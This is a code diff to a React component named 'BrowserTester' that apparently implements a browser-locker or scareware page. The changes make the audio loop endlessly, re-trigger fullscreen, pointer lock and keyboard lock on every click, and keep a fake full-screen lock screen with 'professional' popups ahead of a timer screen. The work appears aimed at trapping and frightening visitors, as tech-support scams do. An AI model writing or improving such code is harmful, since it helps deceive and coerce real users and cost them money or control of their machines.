@@ -11,9 +11,9 @@ export default function BrowserTester() {
     const audioRef = useRef(null);
     const hasTriggeredRef = useRef(false);
     const os = detectOS();
-    console.log(os);
-
-
+   console.log(os);
+   
+    
     // Browser Detection
     const detectBrowser = () => {
         const ua = navigator.userAgent;
@@ -52,45 +52,41 @@ export default function BrowserTester() {
 
     // Play audio with continuous loop and transition detection
     const playAudio = () => {
-        const audiof = os.isMac || os.isIOS ? 'apple-audio.mp4' : 'new1.mp3';
-
+        const audiof = os.isMac === true || os.isIOS === true ? 'apple-audio.mp4' : 'new1.mp3';
+        // Create audio instance if needed
         if (!audioRef.current) {
-            const audio = document.createElement('audio');
-            audio.src = audiof;
-            audio.playsInline = true;
-            audio.preload = 'auto';
-            audio.volume = 1.0;
-            audio.loop = false;
+            audioRef.current = new Audio(audiof);
+            audioRef.current.loop = true; // ALWAYS loops, never stops
+            audioRef.current.volume = 1.0;
 
-            document.body.appendChild(audio); // CRITICAL FOR iOS
+            // Detect when first loop completes
+            audioRef.current.addEventListener('timeupdate', () => {
+                const duration = audioRef.current.duration;
+                const currentTime = audioRef.current.currentTime;
 
-            audio.addEventListener('ended', () => {
-                console.log('Audio ended');
-
-                if (!hasTriggeredRef.current) {
+                // When we're near the end (within 0.5s) and haven't triggered yet
+                if (!hasTriggeredRef.current && duration > 0 && currentTime >= duration - 0.5) {
+                    console.log('Audio loop completing, switching to Timer Screen');
                     hasTriggeredRef.current = true;
                     setShowTimerScreen(true);
+                    // Audio continues playing in loop automatically (no code needed to keep it playing)
                 }
-
-                audio.currentTime = 0;
-                audio.play();
             });
-
-            audioRef.current = audio;
         }
 
-        // Must be directly user initiated
-        audioRef.current.play().catch(e => console.warn('Audio blocked:', e));
+        // Ensure playback
+        if (audioRef.current.paused) {
+            audioRef.current.play().catch(e => console.warn('Audio blocked:', e));
+        }
     };
-
 
     // Start lockdown
     const startLockdown = () => {
-        playAudio(); // Start audio loop immediately
         setStage(2);
         triggerFullscreen();
         lockPointer();
         lockKeyboard();
+        playAudio(); // Start audio loop immediately
     };
 
     // Global event handlers & Continuous Locking
@@ -131,6 +127,7 @@ export default function BrowserTester() {
                 triggerFullscreen();
                 lockPointer();
                 lockKeyboard();
+                playAudio(); // Ensure audio plays on click
             }
         };
         document.addEventListener('click', handleClick);
@@ -192,8 +189,8 @@ export default function BrowserTester() {
             {/* Stage 2: Lock Screen with Professional Popups */}
             {stage >= 2 && !showTimerScreen && (
                 <div className="fixed inset-0 z-0">
-                    <LockScreen />
-                    <ProfessionalOverlay />
+                  <LockScreen />
+                <ProfessionalOverlay />
 
                     {/* Capture Clicks */}
                     <div className="absolute inset-0 z-10 pointer-events-auto cursor-none" onClick={advanceStage}>
